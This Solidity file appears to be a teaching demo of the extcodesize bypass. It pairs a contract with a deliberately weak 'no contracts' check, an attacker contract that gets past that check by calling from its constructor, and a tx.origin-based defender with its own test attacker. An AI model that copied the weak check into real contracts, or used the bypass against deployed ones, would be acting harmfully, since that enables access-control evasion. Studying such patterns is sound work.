// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import "@openzeppelin/contracts/utils/Address.sol";

contract Vulnerable {    

    function checkCaller(address _addr) public view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(_addr) }
        require(size <= 0, "Contract is not allowed");
        return true;
    }
}

contract Attacker {
    Vulnerable public vulnerableContract;
    bool public constructorCallResult;
    bool public functionCallResult;
    
    constructor(address _vulnerableAddress) {
        vulnerableContract = Vulnerable(_vulnerableAddress);
        constructorCallResult = vulnerableContract.checkCaller(address(this));
    }
    
    function attack() public {
        functionCallResult = vulnerableContract.checkCaller(address(this));
    }
}

contract Defender {
    
    function checkCaller() public view returns (bool) {
        require(msg.sender == tx.origin,"Contract is not allowed");
        return true;
    }
}

contract AttackerDefender {
    Defender public defenderContract;
    bool public constructorCallResult;
    bool public functionCallResult;
    
    constructor(address _defenderAddress) {
        defenderContract = Defender(_defenderAddress);
        constructorCallResult = defenderContract.checkCaller();
    }
    
    function attack() public {
        functionCallResult = defenderContract.checkCaller();
    }
}